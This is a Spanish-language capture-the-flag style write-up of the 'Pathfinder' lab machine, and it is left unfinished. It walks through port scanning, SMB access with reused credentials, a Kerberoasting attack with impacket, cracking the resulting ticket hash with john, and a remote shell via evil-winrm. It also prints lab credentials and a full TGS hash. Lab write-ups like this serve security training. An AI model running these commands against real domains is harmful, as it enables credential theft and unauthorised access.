# Pathfinder

En primer lugar comenzamos como siempre comprobando que SO tiene y haciendo un scan de puertos:

```
ping -c 1 10.10.10.30 #ttl=127 por lo que es windows

nmap -p- --open -T5 10.10.10.30 -n
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001 -n -Pn -sC -sV 10.10.10.30

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-03 14:05:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: PATHFINDER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h07m25s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-07-03T14:05:24
|_  start_date: N/A

```

## Samba

Estamos viendo un 445 (Smb) y tenemos un usuario y contraseña conseguido en la máquina anterior "[Shield](shield.md)"&#x20;

sandra:Password1234!

Al probarlo vemos que podemos acceder a los archivos smb

```
smbclient -U 'sandra' -L //10.10.10.30/
Enter WORKGROUP\sandra's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available

```

Podríamos probar en SYSVOL ya que en ocasiones encontramos contraseñas hasheadas, pero en este caso no es posible "[Más sobre SYSVOL](../../pentesting/extra/windows/sysvol.md)"

## KERBEROASTING

Cómo tenemos ante nosotro el puerto 88 "Kerberos" y tenemos una credencial válida podemos probar directamente a hacer un kerberoasting attack para conseguir una nueva contraseña, para ello tenemos la utilidad "GETUserSPNs.py"

```
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py MEGACORP.LOCAL/sandra:Password1234! -dc-ip 10.10.10.30 -request -output tgs.hash

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName                Name     MemberOf                                                    PasswordLastSet             LastLogon                   Delegation 
----------------------------------  -------  ----------------------------------------------------------  --------------------------  --------------------------  ----------
MSSQLSvc/SQL02.MEGACORP.LOCAL:1443  svc_bes  CN=Remote Management Users,CN=Builtin,DC=MEGACORP,DC=LOCAL  2020-03-21 01:16:54.721477  2021-07-03 16:06:32.093506             
MSSQLSvc/SQL02.MEGACORP.LOCAL:1433  svc_bes  CN=Remote Management Users,CN=Builtin,DC=MEGACORP,DC=LOCAL  2020-03-21 01:16:54.721477  2021-07-03 16:06:32.093506             



[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

```

El error de abajo "Clock skew too great" aparece debido a que no tenemos la fecha sincronizada con la máquina atacada. Para poder sincronizarnos podemos descargar "rdate"

```
sudo apt-get install rdate -y
sudo rdate -n 10.10.10.30
```

Ya estaríamos sincronizados, probablemente podáis tener algún problema porque vuestra propia máquina vuelva a coger automáticamente la hora real, en ese caso si no queréis complicaros mucho la vida activad el comando siguiente al mismo tiempo que en otra consola repetis varias veces la sincronización "Una forma muy cutre lo sé":

```
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py MEGACORP.LOCAL/sandra:Password1234! -dc-ip 10.10.10.30 -request -output tgs.hash
[sudo] password for shanks: 
Sorry, try again.
[sudo] password for shanks: 
Sun Jul  4 17:50:18 CEST 2021
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName                Name     MemberOf                                                    PasswordLastSet             LastLogon                   Delegation 
----------------------------------  -------  ----------------------------------------------------------  --------------------------  --------------------------  ----------
MSSQLSvc/SQL02.MEGACORP.LOCAL:1443  svc_bes  CN=Remote Management Users,CN=Builtin,DC=MEGACORP,DC=LOCAL  2020-03-21 01:16:54.721477  2021-07-03 16:06:32.093506             
MSSQLSvc/SQL02.MEGACORP.LOCAL:1433  svc_bes  CN=Remote Management Users,CN=Builtin,DC=MEGACORP,DC=LOCAL  2020-03-21 01:16:54.721477  2021-07-03 16:06:32.093506      

cat tgs.hash                                                              
$krb5tgs$23$*svc_bes$MEGACORP.LOCAL$MEGACORP.LOCAL/svc_bes*$ecc406dac485ed9b3adede
1c29237f0e$93222e74320e210a963f8a72ed70cf6dde0bbd479d8b85172ecc42bd57307b01aebef1d
87b6122b0c80c16eb22a71e2ce2bc1fa13300b4c7fb31870abc8c1d822052bfb1e4337cedeea82b0e4
5a19a66cba431d27b15f3ad384fcab8e087d5de66e396d87671fc4c961212a31358ceb53c06f7e8809
f08e691641ce0cce3cf831aed21d94f9190fa0e8a3429964ad00e673cf104285929163d7938e1c756a
fab2a7d9132830c5f3c9a9a19b7d88357616966ae63d61b9a834966f32f19771ba44b179be68303c13
02c65a65ec7214683355d8563baeffe2d9f58a1902820dc26dc77972714ee4ac452d33c312d354131a
93b03837d607586b44785cc19a87f206def93d86b74d0c829ce3977db637f092063f4301df0c2645a5
714b72f1ccda5fbb150f8499cdab4aa537a399af771a5dcc958d226cff763b18b31a1cd3d50195cc98
d850f7489668cefac623b3e5d503f00f7e42ff8dbaef4f51d7bedac80436fe0b43530bee98730356b8
cc85e6329f166b2d33483cffc3ce73e2b10d01ae6ebc71cc614801d75f292adbf0cbd7f76874543fa8
e863e88772bf879a9cd507f159acebb3e31de92ee4dfeaf92bb86cecd261208c5f424420b2fe6318c3
1973892cca378934192e58a60c806e90a6d33c40f1c815a3a3b3c60b2a9570ad7f4f040d682664166f
3aecf40f6c5d5cf33e6e4e7d3f499737ad3f6238e97f9e1c79eacdaa1057ee1d645cd7205442a1ab12
50c261d599f9097298a6b851e25dca6922df1c5ab4b10495bfdd1ccdab311a9f4034a2b4a5cb88eac6
2a39fbecabe61038dc3de5c8294bd88c1c4ccea20f9726c18790b3d71dee3b46f31de13af14ed9871f
a70c6d08c45577093ed35a5b04bcfb7f99df78f3ae8a92649ad0db7b908efd27464ac112ad6fb61039
26a74ff75f2dd01bf1dbfd16315e46e26bd86d132800e5d9d3a3b4841346dbc3ae760a03837ab5fd0e
3107efa87fc8dc1b1e4b53dbef167e4866fe68d68ed45c6496bd48e96e479acc575609df380cdc44b9
fbf630121c207b4749024f80bbe0b363b1987f29ef89017ee52bd366c8503184e7ab8fa281a5c36a9c
5a77a908dcc7e91a04116db55e4016e46ce6e015e18f63721ceee46f286c573ff075bf1faad84970cd
5e75ec602e70cfe9cd82403bd4175fe4fc6bcc17edd43b0cc48b35fee6df8e483faf32faffa98a44de
6a2008cabef5ebb0bbb595da33778b84cf8ef026904f4b16e31f2149313ee3036c8a9619c7a4499af8
2de286462d405dddf556a9542e09d9b6768b72eeecec50b6e317f21e3
       
```

Y ahora crackeamos la contraseña

```
john --wordlist=/usr/share/wordlists/rockyou.txt tgs.hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Sheffield19      (?)
1g 0:00:00:04 DONE (2021-07-04 10:45) 0.2197g/s 2330Kp/s 2330Kc/s 2330KC/s Sherbear94..Shawne116
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

Perfecto, tenemos un nuevo usuario svc\_bes:Sheffield19; Aún no tenemos ni idea para que lo usaremos, pero poco a poco vamos avanzando. Por ahora sabemos que ni con este ni con sandra podemos conectarnos a través de psexec porque no pueden escribir en las carpetas compartidas por SMB.

## Conexión por evil-winrm

Instalamos y nos conectamos por [evil-winrm](../../herramientas/shell-cheatsheet.md#evil-winrm):

```
gem install evil-winrm
evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19
```

Ahora podemos utilizar Sharphound para introducir toda la información relevante en [Bloodhound ](../../pentesting/escalada-de-privilegios/windows/bloodhound.md)y de esta manera conseguir escalar privilegios:

## Escalar privilegios

Instalamos bloodhound y neo4j

```bash
apt install bloodhound neo4j -y
```

Descargamos sharphound en nuestra máquina:

```bash
wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
```

Desde la consola de evil-winrm

```
Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_bes\Documents> upload SharpHound.ps1
Info: Uploading SharpHound.ps1 to C:\Users\svc_bes\Documents\SharpHound.ps1

                                                             
Data: 1298980 bytes of 1298980 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc_bes\Documents> Import-Module .\SharpHound.ps1
*Evil-WinRM* PS C:\Users\svc_bes\Documents> Invoke-Bloodhound -CollectionMethod All
*Evil-WinRM* PS C:\Users\svc_bes\Documents> dir


    Directory: C:\Users\svc_bes\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         7/6/2021   9:29 AM           9011 20210706092857_BloodHound.zip
-a----         7/6/2021   9:29 AM          10233 NmRhMjNhOTItZDdhMC00ZDc5LWJiYzktYjM5YzY1ZmQwYzYy.bin
-a----         7/6/2021   9:21 AM         974235 SharpHound.ps1


*Evil-WinRM* PS C:\Users\svc_bes\Documents> download 20210706092857_BloodHound.zip
Info: Downloading C:\Users\svc_bes\Documents\20210706092857_BloodHound.zip to 20210706092857_BloodHound.zip

                                                             
Info: Download successful!
```

Tenemos que poner en marcha la consola de neo4j:

```bash
sudo neo4j console
```

Y ahora tenemos montado esto en [http://localhost:7474/](http://localhost:7474/), por lo que al entrar usamos de usuario y contraseña neo4j y nos pedirá cambiar la contraseña

Ahora abrimos bloodhound y tenemos que importar el zip que hemos descargado anteriormente con Evil-WinRM

![](<../../.gitbook/assets/image (6).png>)

![](<../../.gitbook/assets/image (7).png>)

Ya podemos realizar las querys que consideremos, tengo actualmente un problema con bloodhound así que esperaré a solucionarlo para terminar este write-up



> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
